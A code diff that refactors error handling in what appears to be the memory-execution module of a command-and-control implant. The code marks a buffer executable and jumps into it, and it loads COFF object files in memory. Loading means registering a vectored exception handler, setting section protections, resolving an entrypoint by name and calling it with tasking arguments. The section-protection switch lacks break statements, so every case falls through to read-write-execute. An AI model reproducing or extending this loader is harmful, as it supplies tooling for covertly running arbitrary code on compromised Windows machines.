-            if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr))) {
-                return_defer(ntstatus);
-            }
+            x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr));
 
             exec = R_CAST(void(*)(), address);
             exec();
@@ -704,9 +543,8 @@ namespace Memory {
             x_memset(address, 0, size);
 
         defer:
-            if (address) {
-                ntstatus = Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE);
-            }
+            if (address) { Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE); }
+            return success;
         }
 
         BOOL ExecuteObject(_executable *object, const char *entrypoint, char *args, uint32_t size, uint32_t req_id) {
@@ -717,12 +555,10 @@ namespace Memory {
             void *veh_handler   = { };
             void *exec          = { };
 
-            if (!(veh_handler = Ctx->nt.RtlAddVectoredExceptionHandler(1, &Memory::Execute::Debugger))) {
-                return_defer(ERROR_INVALID_EXCEPTION_HANDLER);
-            }
+            x_assert(veh_handler = Ctx->nt.RtlAddVectoredExceptionHandler(1, &Memory::Execute::Debugger));
 
             for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
-                object->section =  P_IMAGE_SECTION_HEADER(object->buffer, i);
+                object->section = P_IMAGE_SECTION_HEADER(object->buffer, i);
 
                 if (object->section->SizeOfRawData > 0) {
                     uint32_t protection = 0;
@@ -734,23 +570,19 @@ namespace Memory {
                     case IMAGE_SCN_MEM_RW:      protection = PAGE_READWRITE;
                     case IMAGE_SCN_MEM_WRITE:   protection = PAGE_WRITECOPY;
                     case IMAGE_SCN_MEM_XCOPY:   protection = PAGE_EXECUTE_WRITECOPY;
-                    default: protection = PAGE_EXECUTE_READWRITE;
+                    default:                    protection = PAGE_EXECUTE_READWRITE;
                     }
 
                     if ((object->section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) == IMAGE_SCN_MEM_NOT_CACHED) {
                         protection |= PAGE_NOCACHE;
                     }
 
-                    if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->sec_map[i].address), &object->sec_map[i].size, protection, nullptr))) {
-                        return_defer(ntstatus);
-                    }
+                    x_ntassert(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->sec_map[i].address), &object->sec_map[i].size, protection, nullptr));
                 }
             }
 
             if (object->fn_map->size) {
-                if (!NT_SUCCESS(ntstatus = Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->fn_map), &object->fn_map->size, PAGE_READONLY, nullptr))) {
-                    return_defer(ntstatus);
-                }
+                x_ntassert(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), R_CAST(void**, &object->fn_map), &object->fn_map->size, PAGE_READONLY, nullptr));
             }
 
             for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSymbols; i++) {
@@ -765,16 +597,14 @@ namespace Memory {
                 }
 #endif
                 if (x_memcmp(symbol_name, entrypoint, x_strlen(entrypoint)) == 0) {
-                    if (!(exec = object->sec_map[object->symbol[i].SectionNumber - 1].address + object->symbol[i].Value)) {
-                        return_defer(ERROR_PROC_NOT_FOUND);
-                    }
+                    x_assert(exec = object->sec_map[object->symbol[i].SectionNumber - 1].address + object->symbol[i].Value);
                 }
             }
 
             for (auto i = 0; i < object->nt_head->FileHeader.NumberOfSections; i++) {
                 if (U_PTR(exec) >= U_PTR(object->sec_map[i].address) && U_PTR(exec) < U_PTR(object->sec_map[i].address) + object->sec_map[i].size) {
-
                     object->section = P_IMAGE_SECTION_HEADER(object->buffer, i);
+
                     if ((object->section->Characteristics & IMAGE_SCN_MEM_EXECUTE) == IMAGE_SCN_MEM_EXECUTE) {
                         success = true;
                     }
@@ -784,8 +614,8 @@ namespace Memory {
             }
 
             if (success) {
-                const auto entry = R_CAST(obj_entry, exec);
-                ExceptionReturn = __builtin_extract_return_addr(__builtin_return_address(0));
+                const auto entry    = R_CAST(obj_entry, exec);
+                ExceptionReturn     = __builtin_extract_return_addr(__builtin_return_address(0));
                 entry(args, size);
             }
 
